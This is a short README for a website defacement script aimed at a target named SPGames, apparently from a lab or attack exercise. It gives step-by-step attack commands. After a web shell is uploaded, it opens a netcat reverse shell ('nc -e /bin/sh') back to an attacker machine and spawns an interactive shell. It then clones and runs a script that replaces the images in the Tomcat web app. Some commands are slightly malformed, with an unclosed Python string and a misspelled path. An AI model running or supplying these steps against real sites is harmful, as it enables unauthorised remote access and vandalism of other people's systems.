# deface_script
## Made for SPGames
Replaces images in /game_images and /images 

# Instructions (after uploading web shell)
### Kali
```
nc -nvlp 4444
```
### Web Shell CMD
```
nc -e /bin/sh 192.168.(fill in) 4444
```
### Kali
```
python -c 'import pty; pty.spawn("/bin/bash");
cd /opt/tomcat-9/apache-timcat-9.0.30/webapps/spgames/game_images
git clone https://github.com/bryonkyd/deface_script.git
cd deface_script/
python3 deface.py
```
